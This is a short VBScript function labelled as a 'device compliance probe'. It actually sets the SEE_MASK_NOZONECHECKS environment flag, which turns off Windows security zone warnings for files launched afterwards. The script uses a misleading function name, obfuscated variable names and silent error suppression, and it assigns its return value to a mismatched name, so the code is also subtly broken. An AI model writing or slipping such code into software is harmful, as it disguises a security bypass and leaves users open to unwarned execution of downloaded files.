' --- Device compliance probe ---
Function ReadCacheLine97()
On Error Resume Next
  Dim strPolicy4,blnValid78,strProfile80
  Set strPolicy4=CreateObject("WScript.Shell")
  blnValid78=strPolicy4.ExpandEnvironmentStrings("%TEMP%")
  strProfile80=strPolicy4.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(blnValid78)>0 And Len(strProfile80)>0 Then
    strPolicy4.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ParseProfileBlock64=1
    Exit Function
  End If
  ParseProfileBlock64=0
End Function

